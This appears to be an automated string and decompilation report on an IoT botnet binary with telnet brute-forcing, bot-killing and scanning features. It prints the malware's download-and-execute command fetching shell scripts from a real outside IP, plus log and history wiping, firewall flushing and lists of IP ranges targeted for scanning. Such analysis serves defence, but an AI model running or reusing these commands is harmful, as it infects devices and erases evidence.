=============================================================================
========	BINARY ID :f1a201edc884b8d44e992239bb5cf3c3bca2e618==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2184
SUPSCPECTED LINES COUNT :217
SUPSCPECTED STRINGS COUNT (DISTINCT) :28
SUPSCPECTED STRINGS WEIGHT :107
SUSPECT STRING SCORE : [107 / 150] 71%
USER AGENTS STRINGS COUNT :62
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :199
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
nopqrstuvwß
)*+%ÉÈPQRSTUVWXYZ
telnet
cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
/proc/cpuinfo
PING
gethostbyname
\e[0;31m[LoveSec] Bruteforced IP: \e[0;33m%s | \e[0;31mUsername: \e[0;33m%s | \e[0;31mPassword: \e[0;33m%s\e[0m
%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00
cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
bin*
bot*
\b/dev/netslink/
/usr/
>%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n
pkill -9 %s\r\n
rm -rf /bin/netstat
pkill -9 busybox
pkill -9 perl
/sbin/iptables -F;/sbin/iptables -X
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
http
\bFailed opening raw socket.
Invalid flag "%s"
GETLOCALIP
BOTKILL
Killing Bots
LOOPING PAYLOAD
TELNET
TELNET ON | OFF
NETIS
[NETIS] SCANNER Starting
HTTP
/proc/net/route
/usr/bin/python
/usr/sbin/dropbear
\e[1;36mWiFi's \e[0;32mPenthouse\e[1;34m Zombie Connected| \e[1;31m%s
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
Unknown host
Host name lookup failure
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/i386/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4372
strstr.c
_string_syserrmsgs.c
error_msg
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
__malloc_largebin_index
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
hostname_to_ip
__GI_srandom_r
Server_Botport
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
ngPid
strstr
init_rand
rand
StartTheNetis
HackerScan2
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
HackerScan
__GI_inet_pton
gethostbyname
__vfork
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
hekkertelnet
__GI_vfork
NetisRanges
__GI_inet_addr
__libc_connect
pids
sigprocmask
^8PSh_U
xAPPSh G
PPShL
^8PSh_U
^8PSh_U
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
Mozilla/5.0 (PLAYSTATION 3; 3.55)
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
wii libnup/1.0
Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
PSP (PlayStation Portable); 2.00
Bunjalloo/0.7.6(Nintendo DS;U;en)
Doris/1.15 [en] (Symbian)
BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
188.213.170.176
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
history -c
rm -rf ~/.bash_history
history -w
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00
cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 71191
+++TOTAL FUNCTIONS 			:261
+++LINES PER FUNCTION RATIO 	: 272.76245210728
+++SUSPECTED LINES COUNT 	: 2148
+++SUSPECTED LINES RATIO 	: 3.01723532468992
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 71191
+++WHILE (TRUE) LINES			: 14684
+++WHILE (TRUE) LINES RATION		:20.6262027503477%
+++WHILE (TRUE) LOOPS COUNT		: 280
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/"
    char (*v42)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v134 = __libc_open("/proc/cpuinfo", 0); // 0x8048f5a
    int32_t v134 = __libc_open("/proc/cpuinfo", 0); // 0x8049122
        sprintf(v137, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");
    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"rm -rf /bin/netstat");
                int32_t v139 = __libc_open("/proc/net/route", 0); // 0x80514b3
    int32_t result = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"ROUTER" : (int32_t)"SERVER"; // 0x8051601
    int32_t v124 = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"/usr/sbin/dropbear" : (int32_t)"sshd";
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    if (__libc_open("/dev/null", v136) != v134) {
    int32_t v135 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v134); // 0x8056f25
        int32_t v148 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v134); // 0x8056f43
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(a1, (char *)a2, 0, -1);
int32_t _stdio_fopen(int32_t a1, char * a2, int32_t a3, int32_t a4) {
    int32_t v134 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v133); // 0x805835d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v133);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",

    char (*v40)[16] = "188.213.170.176";

    char (*v42)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";

        szprintf(v140, (int32_t)"112.5.%d.%d", (int32_t)v132);

        szprintf(v141, (int32_t)"117.165.%d.%d", (int32_t)v132);

        szprintf(v142, (int32_t)"85.3.%d.%d", (int32_t)v132);

        szprintf(v143, (int32_t)"37.158.%d.%d", (int32_t)v132);

        szprintf(v144, (int32_t)"95.9.%d.%d", (int32_t)v132);

        szprintf(v145, (int32_t)"41.252.%d.%d", (int32_t)v132);

        szprintf(v146, (int32_t)"58.71.%d.%d", (int32_t)v132);

        szprintf(v147, (int32_t)"104.55.%d.%d", (int32_t)v132);

        szprintf(v148, (int32_t)"78.186.%d.%d", (int32_t)v132);

        szprintf(v149, (int32_t)"78.189.%d.%d", (int32_t)v132);

        szprintf(v150, (int32_t)"221.120.%d.%d", (int32_t)v132);

        szprintf(v151, (int32_t)"88.5.%d.%d", (int32_t)v132);

        szprintf(v152, (int32_t)"41.254.%d.%d", (int32_t)v132);

        szprintf(v153, (int32_t)"103.20.%d.%d", (int32_t)v132);

        szprintf(v154, (int32_t)"103.47.%d.%d", (int32_t)v132);

        szprintf(v155, (int32_t)"103.57.%d.%d", (int32_t)v132);

        szprintf(v156, (int32_t)"45.117.%d.%d", (int32_t)v132);

        szprintf(v157, (int32_t)"101.51.%d.%d", (int32_t)v132);

        szprintf(v158, (int32_t)"137.59.%d.%d", (int32_t)v132);

        szprintf(v159, (int32_t)"1.56.%d.%d", (int32_t)v132);

        szprintf(v160, (int32_t)"1.188.%d.%d", (int32_t)v132);

        szprintf(v161, (int32_t)"14.204.%d.%d", (int32_t)v132);

        szprintf(v162, (int32_t)"27.0.%d.%d", (int32_t)v132);

        szprintf(v163, (int32_t)"27.8.%d.%d", (int32_t)v132);

        szprintf(v164, (int32_t)"27.50.%d.%d", (int32_t)v132);

        szprintf(v165, (int32_t)"27.54.%d.%d", (int32_t)v132);

        szprintf(v166, (int32_t)"27.98.%d.%d", (int32_t)v132);

        szprintf(v167, (int32_t)"27.112.%d.%d", (int32_t)v132);

        szprintf(v168, (int32_t)"27.192.%d.%d", (int32_t)v132);

        szprintf(v169, (int32_t)"36.32.%d.%d", (int32_t)v132);

        szprintf(v170, (int32_t)"36.248.%d.%d", (int32_t)v132);

        szprintf(v171, (int32_t)"39.64.%d.%d", (int32_t)v132);

        szprintf(v172, (int32_t)"42.4.%d.%d", (int32_t)v132);

        szprintf(v173, (int32_t)"42.48.%d.%d", (int32_t)v132);

        szprintf(v174, (int32_t)"42.52.%d.%d", (int32_t)v132);

        szprintf(v175, (int32_t)"42.56.%d.%d", (int32_t)v132);

        szprintf(v176, (int32_t)"42.63.%d.%d", (int32_t)v132);

        szprintf(v177, (int32_t)"42.84.%d.%d", (int32_t)v132);

        szprintf(v178, (int32_t)"42.176.%d.%d", (int32_t)v132);

        szprintf(v179, (int32_t)"42.224.%d.%d", (int32_t)v132);

        szprintf(v180, (int32_t)"42.176.%d.%d", (int32_t)v132);

        szprintf(v181, (int32_t)"43.253.%d.%d", (int32_t)v132);

        szprintf(v182, (int32_t)"43.230.%d.%d", (int32_t)v132);

        szprintf(v183, (int32_t)"163.53.%d.%d", (int32_t)v132);

        szprintf(v184, (int32_t)"43.230.%d.%d", (int32_t)v132);

        szprintf(v185, (int32_t)"62.252.%d.%d", (int32_t)v132);

        szprintf(v186, (int32_t)"43.245.%d.%d", (int32_t)v132);

        szprintf(v187, (int32_t)"62.255.%d.%d", (int32_t)v132);

        szprintf(v188, (int32_t)"123.25.%d.%d", (int32_t)v132);

        szprintf(v189, (int32_t)"103.54.%d.%d", (int32_t)v132);

        szprintf(v190, (int32_t)"27.255.%d.%d", (int32_t)v132);

        szprintf(v191, (int32_t)"103.204.%d.%d", (int32_t)v132);

        szprintf(v192, (int32_t)"123.24.%d.%d", (int32_t)v132);

        szprintf(v193, (int32_t)"113.191.%d.%d", (int32_t)v132);

